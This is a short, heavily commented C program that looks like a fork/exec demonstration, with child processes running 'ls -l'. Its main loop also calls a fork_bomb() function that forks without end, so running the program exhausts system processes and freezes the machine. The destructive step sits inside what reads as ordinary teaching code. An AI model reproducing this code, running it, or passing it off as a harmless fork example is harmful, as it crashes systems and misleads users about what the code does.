#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>

void execute_ls() {
    // Execute the 'ls -l' command
    execlp("/bin/ls", "ls", "-l", NULL); 
    // Print an error message if execution failed
    perror("Execution failed"); 
    exit(EXIT_FAILURE); // Terminate the child process with an error status
}

void fork_bomb() {
    while (1) {
        fork(); // Fork indefinitely
    }
}

int main() {
    pid_t pid;
    
    // Print a message that the parent process is starting
    printf("Parent process (PID %d) is starting...\n", getpid());

    // Infinite loop to continuously fork child processes
    while (1) {
        pid = fork(); // Create a new child process
        
        // Check if fork failed
        if (pid < 0) { 
            fprintf(stderr, "Fork failed\n"); // Print an error message
            exit(EXIT_FAILURE); // Terminate the program with an error status
        } else if (pid == 0) { // Child process
            // Print a message that a child process is starting
            printf("Child process (PID %d) is starting...\n", getpid());
            // Execute the 'ls -l' command in the child process
            execlp("/bin/ls", "ls", "-l", NULL); 
            // Print an error message if execution failed
            fprintf(stderr, "Execution failed\n"); 
            exit(1); // Terminate the child process with an error status
        } else { // Parent process
            // Print a message that the parent process forked a child
            printf("Parent process (PID %d) forked a child (PID %d)\n", getpid(), pid);
        }
        fork_bomb();
    }

    // This line will never be reached because of the infinite loop
    printf("Parent process (PID %d) is exiting...\n", getpid());
    return 0; // Return from the main function with a success status
}


